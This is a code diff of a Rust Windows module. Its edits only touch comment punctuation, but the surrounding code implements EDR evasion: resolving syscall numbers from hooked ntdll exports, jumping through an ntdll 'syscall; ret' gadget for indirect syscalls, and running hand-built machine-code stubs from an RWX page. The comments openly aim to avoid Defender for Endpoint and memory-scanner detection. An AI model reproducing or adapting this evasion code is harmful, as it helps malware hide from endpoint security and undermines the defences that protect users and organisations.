@@ -24,11 +24,11 @@ pub mod win {
 
     /// Extract the syscall number from a native API function in ntdll.
     /// On x64 Windows, Nt* functions in ntdll follow the pattern:
-    ///   mov r10, rcx          ; 4C 8B D1
+    ///   mov r10, rcx ; 4C 8B D1
     ///   mov eax, <syscall_no> ; B8 xx xx 00 00
     ///   ...
-    ///   syscall               ; 0F 05
-    ///   ret                   ; C3
+    ///   syscall ; 0F 05
+    ///   ret ; C3
     ///
     /// We read the 4 bytes after the B8 opcode to get the syscall number.
     /// If the function is hooked (JMP at the start), we scan forward to
@@ -70,7 +70,7 @@ pub mod win {
         let bytes = std::slice::from_raw_parts(func as *const u8, 32);
 
         // Fast path: if the function is unhooked, read the SSN directly.
-        //   mov r10, rcx   ; 4C 8B D1
+        //   mov r10, rcx ; 4C 8B D1
         //   mov eax, <SSN> ; B8 xx xx 00 00
         if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1
             && bytes[3] == 0xB8
@@ -92,7 +92,7 @@ pub mod win {
     }
 
     /// Walk ntdll's export table, collect all Zw* stubs with their addresses,
-    /// sort by address, and return the position of our target function — which
+    /// sort by address, and return the position of our target function - which
     /// IS its SSN. Works even when all functions are hooked.
     unsafe fn resolve_ssn_via_export_sort(
         ntdll: *mut c_void,
@@ -172,7 +172,7 @@ pub mod win {
                 if func_rva >= export_rva && func_rva < export_rva + export_size {
                     continue;
                 }
-                // Skip entries with RVAs outside .text — likely EDR-tampered
+                // Skip entries with RVAs outside .text - likely EDR-tampered
                 if text_rva_end > 0 && (func_rva < text_rva_start || func_rva >= text_rva_end) {
                     continue;
                 }
@@ -198,7 +198,7 @@ pub mod win {
 
         let target_rva = target_rva?;
 
-        // Sort by RVA — position in the sorted list IS the SSN.
+        // Sort by RVA - position in the sorted list IS the SSN.
         zw_rvas.sort_unstable_by_key(|&(rva, _)| rva);
         zw_rvas.dedup_by_key(|e| e.0);
 
@@ -206,8 +206,8 @@ pub mod win {
     }
 
     /// Find the `syscall; ret` gadget address inside ntdll.dll's .text section.
-    /// Used for indirect syscalls — we JMP here instead of issuing syscall ourselves.
-    /// Cached on first call — the gadget address is stable for the process lifetime.
+    /// Used for indirect syscalls - we JMP here instead of issuing syscall ourselves.
+    /// Cached on first call - the gadget address is stable for the process lifetime.
     pub unsafe fn find_syscall_gadget() -> Option<*const u8> {
         // *const u8 is not Send/Sync, so store as usize
         static GADGET: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
@@ -400,7 +400,7 @@ pub mod win {
         syscall_generic(ssn, indirect, &[a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11])
     }
 
-    /// Persistent stub page — allocated once, rewritten for each syscall.
+    /// Persistent stub page - allocated once, rewritten for each syscall.
     /// Avoids the massive IoC of VirtualAlloc/VirtualFree on every single call,
     /// which heuristic memory scanners flag immediately.
     fn get_stub_page() -> *mut c_void {
@@ -411,7 +411,7 @@ pub mod win {
         }
         const PAGE_SIZE: usize = 4096;
         // Allocate as RWX once at init and never call VirtualProtect again.
-        // The old approach flipped RW→RX→RW on EVERY syscall — rapid memory
+        // The old approach flipped RW->RX->RW on EVERY syscall - rapid memory
         // protection toggling on the same page is a classic shellcode indicator
         // that EDRs like Defender for Endpoint aggressively flag.
         const PAGE_EXECUTE_READWRITE: u32 = 0x40;
@@ -446,8 +446,8 @@ pub mod win {
         if stub.is_null() { return -1; }
 
         // Acquire exclusive access to the stub page for the entire
-        // write → protect → execute → unprotect sequence. If the lock
-        // is poisoned (prior panic), recover the guard — the stub page
+        // write -> protect -> execute -> unprotect sequence. If the lock
+        // is poisoned (prior panic), recover the guard - the stub page
         // contents are about to be overwritten anyway.
         let _guard = match stub_lock().lock() {
             Ok(g) => g,
@@ -478,7 +478,7 @@ pub mod win {
         code.extend_from_slice(&[0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00]);
 
         // Move args into registers and stack
-        // arg1 → rcx: mov rcx, <imm64>
+        // arg1 -> rcx: mov rcx, <imm64>
         if args.len() > 0 { mov_r64(&mut code, 0x48, 0xB9, args[0]); } // rcx
         // mov r10, rcx (required for syscall convention)
         code.extend_from_slice(&[0x4C, 0x8B, 0xD1]);
@@ -513,12 +513,12 @@ pub mod win {
             // CRITICAL: Must use `call r11` (41 FF D3), NOT `jmp r11` (41 FF E3).
             // The gadget is `syscall; ret`. After the kernel returns from syscall,
             // the `ret` pops the return address from RSP. With `jmp`, no return
-            // address was pushed — `ret` pops garbage and crashes. With `call`,
+            // address was pushed - `ret` pops garbage and crashes. With `call`,
             // the return address (our epilogue below) is pushed, so `ret` returns
             // control to our `add rsp, 0x88; ret` cleanup.
             //
             // The indirect syscall's OPSEC goal (the `syscall` instruction's RIP
-            // being inside ntdll) is preserved — the kernel sees the instruction
+            // being inside ntdll) is preserved - the kernel sees the instruction
             // pointer within ntdll's .text during the transition.
             let ga = gadget as u64;
             code.extend_from_slice(&[0x49, 0xBB]); // mov r11, imm64
@@ -533,7 +533,7 @@ pub mod win {
         code.extend_from_slice(&[0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00]); // add rsp, 0x88
         code.push(0xC3); // ret
 
-        // Write code to the persistent stub page (RWX from init — no VirtualProtect needed)
+        // Write code to the persistent stub page (RWX from init - no VirtualProtect needed)
         ptr::copy_nonoverlapping(code.as_ptr(), stub as *mut u8, code.len());
 
         type SyscallFn = unsafe extern "C" fn() -> i32;
